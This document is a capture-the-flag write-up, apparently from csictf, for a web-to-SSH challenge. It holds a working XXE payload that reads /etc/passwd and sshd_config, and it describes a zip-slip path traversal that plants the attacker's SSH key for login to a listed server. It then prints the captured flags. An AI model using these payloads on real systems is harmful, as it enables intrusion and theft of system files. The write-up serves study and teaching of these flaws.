# HTB 0x3

Author: [thebongy](https://github.com/thebongy) and [roerohan](https://github.com/roerohan)

## Description

Hackthebox challenge 3.

## Requirements

- Docker

## Sources

```
Server is at 34.93.215.188.
```

## Exploit

Once you complete `HTB 0x2`, you can see 2 pages, `/admin` and `/home`. `/admin` has an XXE vulnerability, so you can read `/etc/passwd` using the following payload:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

There, you see a link: 

```
...
csictf:x:1005:1006:csictf,csictf,csictf,csictf,csictf:/home/csictf:/bin/bash
administrator:x:1006:1007:administrator,admin,admin,admin,admin:/home/administrator:/bin/bash
https://gist.github.com/sivel/c68f601137ef9063efd7
```

When you visit that link you find out some information about a custom ssh authentication. You can use XXE again to get `sshd_config`.

```
# csictf{cu5t0m_4uth0rizat10n}
AuthorizedKeysCommand /usr/local/bin/userkeys.sh
AuthorizedKeysCommandUser nobody
```

You notice 2 things. First, the flag for `HTB 0x5`. Next, you see that there's a custom authorization command. 

```bash
$ cat /usr/local/bin/userkeys.sh
#!/bin/bash

if [ "$1" == "csictf" ]; then
        cat /home/administrator/uploads/keys/*
else
        echo ""
fi
```

You can see that the script prints all the keys in `/home/administrator/uploads/keys/*` and uses them for authentication. So, we identify the target where we need to place our payload (ssh key). We know that on `/home` we can upload zip files, so this might be exploitable through `zip-slip`. We can upload a zip with a path like `../../../../../../../../home/administrator/uploads/keys/id_rsa.pub`, where `id_rsa.pub` holds our public key (put enough `../../` so that the path becomes absolute). Now that your public key is on the server, you can just `ssh csictf@34.93.215.188 -p 3000` and you're in the server. You can `cat flag.txt` on the server.

The flag is:

```
csictf{w3lc0m3_t0_th3_s3rv3r}
```